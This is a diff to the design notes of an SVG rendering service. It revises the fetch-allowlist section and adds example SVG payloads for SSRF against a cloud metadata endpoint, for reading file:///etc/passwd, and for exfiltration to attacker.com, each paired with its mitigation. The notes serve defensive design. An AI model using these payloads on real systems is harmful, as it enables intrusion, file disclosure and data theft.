@@ -26,7 +26,7 @@ flowchart TD
 
     BACKEND["<b>6. Render Service Backend</b>"]
 
-    STYLE -->|"font / CSS request"| SEC3["<b>URL allowlist</b>"]
+    STYLE -->|"font / CSS request"| SEC3["<b>Fetch allowlist</b>"]
     BUILD -->|"image request"| SEC3
     SEC3 -->|"yes"| FETCH
     SEC3 -->|"no"| WARN3["⚠ block & log"]
@@ -52,8 +52,8 @@ The five layers defend against three kinds of attack:
 2. **Data exfiltration** — steals readable data and leaks it to an attacker
    server. Elements: `<style>`.
 3. **SSRF (Server-Side Request Forgery)** — makes the engine fetch an
-   attacker-chosen URL (internal service, `file://`). Elements: `<image>`,
-   `@import`, `@font-face`.
+   attacker-chosen URL: an internal service, a local `file://` path, or an
+   attacker server (tracking). Elements: `<image>`, `@import`, `@font-face`.
 
 The same category can appear at more than one stage: layers 1, 4 and 5 all
 defend against resource exhaustion, but each guards a different stage of the
@@ -79,15 +79,26 @@ and element count during tokenization.
 **Solution:** blocks injected SVG `<style>` from reading host-document data via
 attribute selectors + `url()`.
 
-### URL allowlist (Stage 3 — Fetch)
-**Category:** SSRF (Server-Side Request Forgery) — remote image fetch
-**Example:**
+### Fetch allowlist (Stage 3 — Fetch)
+**Category:** SSRF (Server-Side Request Forgery) — untrusted fetch
+
+**Example — SSRF (internal service):**
+```svg
+<svg><image href="http://169.254.169.254/latest/meta-data" width="1" height="1"/></svg>
+```
+**Solution:** origin allowlist — only allowlisted hosts may be reached.
+
+**Example — file disclosure:**
+```svg
+<svg><image href="file:///etc/passwd" width="1" height="1"/></svg>
+```
+**Solution:** scheme allowlist — only `http(s)` and `data:` are fetchable, so `file:` is blocked.
+
+**Example — tracking / exfiltration:**
 ```svg
 <svg><image href="https://attacker.com/collect?d=SECRET" width="1" height="1"/></svg>
 ```
-**Solution:** rejects untrusted schemes and origins (`<image>`, `@import`,
-`@font-face`, `file://`, tracking) before any request leaves the process, and
-audits the image-decode FFI.
+**Solution:** origin allowlist — `attacker.com` is not allowlisted, so the request is dropped.
 
 ### Expansion & geometry limits (Stage 4 — Build)
 **Category:** resource exhaustion — `<use>` mutual recursion
